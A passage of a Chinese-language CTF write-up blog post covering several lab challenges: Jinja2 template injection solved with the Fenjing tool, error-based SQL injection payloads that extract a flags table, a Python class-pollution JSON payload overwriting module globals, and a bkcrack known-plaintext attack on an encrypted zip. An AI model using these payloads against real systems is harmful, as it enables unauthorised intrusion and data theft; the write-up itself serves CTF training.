+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015213552321.png" srcset="/img/loading.gif" lazyload alt="image-20251015213552321"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;b5de6c54-fb04-<span class="hljs-number">4604</span>-bfb3-<span class="hljs-number">5</span>b4da05add48&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="留言板-massage-board"><a href="#留言板-massage-board" class="headerlink" title="留言板-massage-board"></a><strong>留言板-massage-board</strong></h3><p><img src="/images/QuestionCTF-Week2-wp/image-20251015231136040.png" srcset="/img/loading.gif" lazyload alt="image-20251015231136040"></p>
+<p><strong>jinjia2</strong>，特别关注这个</p>
+<p>源码里又发现ssti</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015231225204.png" srcset="/img/loading.gif" lazyload alt="image-20251015231225204"></p>
+<p>测试</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015231301828.png" srcset="/img/loading.gif" lazyload alt="image-20251015231301828"></p>
+<p>果然是SSTI模板注入</p>
+<p>这里我手工测试了几次，发现过滤了很多东西，所以我转去用<strong>Fenjing</strong>了</p>
+<p>用自带的example.py，运行了<code>ls /</code>命令，得到flag在根目录下</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015231507656.png" srcset="/img/loading.gif" lazyload alt="image-20251015231507656"></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015231522803.png" srcset="/img/loading.gif" lazyload alt="image-20251015231522803"></p>
+<p>或者使用命令：</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">python -m fenjing crack --url <span class="hljs-string">&#x27;http://challenge.ilovectf.cn:30121/ssti&#x27;</span> --detect-mode fast --inputs message --<span class="hljs-keyword">method</span> <span class="hljs-title function_">POST</span><br></code></pre></td></tr></table></figure>
+
+<p>运行一段时间后，得到flag</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251015232022890.png" srcset="/img/loading.gif" lazyload alt="image-20251015232022890"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">85</span>de8c39-e686-<span class="hljs-number">4195</span>-<span class="hljs-number">9</span>c2f-<span class="hljs-number">07</span>f582614529&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="登录和查询-ezsql"><a href="#登录和查询-ezsql" class="headerlink" title="登录和查询-ezsql"></a>登录和查询-ezsql</h3><p><img src="/images/QuestionCTF-Week2-wp/image-20251016165139101.png" srcset="/img/loading.gif" lazyload alt="image-20251016165139101"></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165202122.png" srcset="/img/loading.gif" lazyload alt="image-20251016165202122"></p>
+<p>进入后，发现一个网盘地址，下载下来后，得到一个字典和readme文档</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165302756.png" srcset="/img/loading.gif" lazyload alt="image-20251016165302756"></p>
+<p>内容如下</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165328741.png" srcset="/img/loading.gif" lazyload alt="image-20251016165328741"></p>
+<p>根据提示，使用bp的Intruder模块进行爆破</p>
+<p>得到账号密码为admin:admin123</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165437190.png" srcset="/img/loading.gif" lazyload alt="image-20251016165437190"></p>
+<p>进入后显示如下</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165503026.png" srcset="/img/loading.gif" lazyload alt="image-20251016165503026"></p>
+<p>但是没发现注入点，再去看一下md文档，发现这句话，参数可能就是id，进行测试</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165538355.png" srcset="/img/loading.gif" lazyload alt="image-20251016165538355"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>出现报错</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165628320.png" srcset="/img/loading.gif" lazyload alt="image-20251016165628320"></p>
+<p>有报错我们尝试报错注入</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">0</span>x7e,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> database()))))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016165704451.png" srcset="/img/loading.gif" lazyload alt="image-20251016165704451"></p>
+<p>得到数据库名：<strong>ctf</strong></p>
+<p>不过md文档已经提示了flag在flags表下</p>
+<p>直接查询</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">0</span>x7e,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> group_concat(flag) from flags))))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016170038784.png" srcset="/img/loading.gif" lazyload alt="image-20251016170038784"></p>
+<p>长度太长了，截取一下</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; and(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flags),<span class="hljs-number">1</span>,<span class="hljs-number">30</span>)))))--+<br></code></pre></td></tr></table></figure>
+
+<p>得到一部分：<strong>flag{</strong></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016171626747.png" srcset="/img/loading.gif" lazyload alt="image-20251016171626747"></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; and(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flags),<span class="hljs-number">31</span>,<span class="hljs-number">30</span>)))))--+<br></code></pre></td></tr></table></figure>
+
+<p>得到第二部分：<strong>6ee453bc-cd3d-4ada-b75e-f7a7b5</strong></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016171713498.png" srcset="/img/loading.gif" lazyload alt="image-20251016171713498"></p>
+<p>再来</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27; and(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flags),<span class="hljs-number">61</span>,<span class="hljs-number">30</span>)))))--+<br></code></pre></td></tr></table></figure>
+
+<p>得到最后一部分：<strong>3731d5}</strong></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016171747245.png" srcset="/img/loading.gif" lazyload alt="image-20251016171747245"></p>
+<p>综合一下得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">6</span>ee453bc-cd3d-<span class="hljs-number">4</span>ada-b75e-f7a7b53731d5&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="这是什么函数-func"><a href="#这是什么函数-func" class="headerlink" title="这是什么函数-func"></a>这是什么函数-func</h3><p><img src="/images/QuestionCTF-Week2-wp/image-20251016172127762.png" srcset="/img/loading.gif" lazyload alt="image-20251016172127762"></p>
+<p>进入后显示需要提交json数据，并且提示函数不在这个界面</p>
+<p>访问&#x2F;flag</p>
+<p>发现只有一句话：where is the flag?how to get the flag?</p>
+<p>使用dirsearch扫描一下目录，发现一个src目录</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016174600807.png" srcset="/img/loading.gif" lazyload alt="image-20251016174600807"></p>
+<p>进入，发现源代码</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016174618654.png" srcset="/img/loading.gif" lazyload alt="image-20251016174618654"></p>
+<p>找个在线网站大致格式化看一下</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016174729936.png" srcset="/img/loading.gif" lazyload alt="image-20251016174729936"></p>
+<p>发现需要使全局变量 <code>cat</code> 和 <code>dog</code> 相等。通过分析代码，允许通过 JSON 数据污染 <code>instance</code> 对象，利用 merge 函数的递归合并特性，可以间接修改全局变量 <code>cat</code> 和 <code>dog</code>。</p>
+<p><code>instance</code> 是 <code>cls</code> 类的一个实例，通过污染 <code>instance.__class__</code>（即 <code>cls</code> 类），可以访问到 <code>cls.__init__</code> 方法的 <code>__globals__</code> 属性，该属性指向模块的全局变量字典。</p>
+<p>修改 <code>__globals__</code> 中的 <code>cat</code> 和 <code>dog</code> 键值，即可改变全局变量 <code>cat</code> 和 <code>dog</code> 的值，使它们相等</p>
+<p>具体步骤如下：</p>
+<p>构造json：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__class__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;cat&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后访问**&#x2F;flag**即可得到flag</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016175211949.png" srcset="/img/loading.gif" lazyload alt="image-20251016175211949"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;1b6dbbf9-5d5c-<span class="hljs-number">45b9</span>-<span class="hljs-number">9368</span>-a9d83e500592&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="俱乐部之旅-2-我邮件呢？？"><a href="#俱乐部之旅-2-我邮件呢？？" class="headerlink" title="俱乐部之旅(2) - 我邮件呢？？"></a><strong>俱乐部之旅(2) - 我邮件呢？？</strong></h3><p><img src="/images/QuestionCTF-Week2-wp/image-20251016223201573.png" srcset="/img/loading.gif" lazyload alt="image-20251016223201573"></p>
+<p>进行流量分析，一进来就发现可疑流量</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016223242537.png" srcset="/img/loading.gif" lazyload alt="image-20251016223242537"></p>
+<p>右键追踪流，发现一个压缩包被base64编码了</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016223353836.png" srcset="/img/loading.gif" lazyload alt="image-20251016223353836"></p>
+<p>内容太长，另存为后，删掉前后额外字符</p>
+<p>使用脚本解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># base64_decoder.py</span><br><span class="hljs-keyword">import</span> base64<br><br>INPUT_FILE = <span class="hljs-string">&#x27;C:/AAAMethods/python脚本/base解码/1.txt&#x27;</span>       <span class="hljs-comment"># 输入文件路径</span><br>OUTPUT_FILE = <span class="hljs-string">&#x27;C:/AAAMethods/python脚本/base解码/2.txt&#x27;</span>  <span class="hljs-comment"># 输出文件路径</span><br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># 读取编码文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(INPUT_FILE, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f_in:<br>        encoded_data = f_in.read()<br>    <br>    <span class="hljs-comment"># 解码Base64内容</span><br>    decoded_data = base64.b64decode(encoded_data)<br>    <br>    <span class="hljs-comment"># 写入解码结果到输出文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(OUTPUT_FILE, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f_out:<br>        f_out.write(decoded_data)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;✅ Base64解码成功！结果已保存到 <span class="hljs-subst">&#123;OUTPUT_FILE&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">except</span> FileNotFoundError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 错误：找不到输入文件 <span class="hljs-subst">&#123;INPUT_FILE&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;❌ 解码过程中发生错误：<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016223436956.png" srcset="/img/loading.gif" lazyload alt="image-20251016223436956"></p>
+<p>将其后缀改为zip即可，发现需要密码</p>
+<p>先用010editor打开，发现提示：<strong>Access to the congratulatory letter requires your identity hash as the password</strong></p>
+<p>需要用身份的哈希作为密码</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251016223651102.png" srcset="/img/loading.gif" lazyload alt="image-20251016223651102"></p>
+<p><strong>后记：</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">我做到这里就不会了，查看了官方<span class="hljs-keyword">wp</span>，发现是用png文件头对图片进行明文攻击，这里放上该题官方步骤<br></code></pre></td></tr></table></figure>
+
+<p>打开压缩包可以看到⽂件被加密，根据注释可以⽤png⽂件头对图⽚进⾏明⽂攻击</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251101224602041.png" srcset="/img/loading.gif" lazyload alt="image-20251101224602041"></p>
+<p>⽤bkcrack攻击⼀下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bkcrack -C !0/test.zip -c id_card.png -p !0/png_header -o 0<br></code></pre></td></tr></table></figure>
+
+<p>成功获得三段密钥后提取图⽚，得到txt⽂档的密码并解压</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251101224634318.png" srcset="/img/loading.gif" lazyload alt="image-20251101224634318"></p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251101224700854.png" srcset="/img/loading.gif" lazyload alt="image-20251101224700854"></p>
+<p>解压后在txt下⽅找到flag</p>
+<p><img src="/images/QuestionCTF-Week2-wp/image-20251101224723024.png" srcset="/img/loading.gif" lazyload alt="image-20251101224723024"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E8%B5%9B%E9%A2%98wp/" class="category-chain-item">赛题wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>QuestionCTF-Week2-wp</div>
+      <div>https://goocean5263.github.io/2025/11/02/QuestionCTF-Week2-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Goocean5263</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年11月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/11/02/2025%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%8E%84%E6%AD%A6%E6%9D%AF/" title="2025成都大学玄武杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2025成都大学玄武杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/02/QuestionCTF-Week1-wp/" title="QuestionCTF-Week1-wp">
+                        <span class="hidden-mobile">QuestionCTF-Week1-wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Goocean5263</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
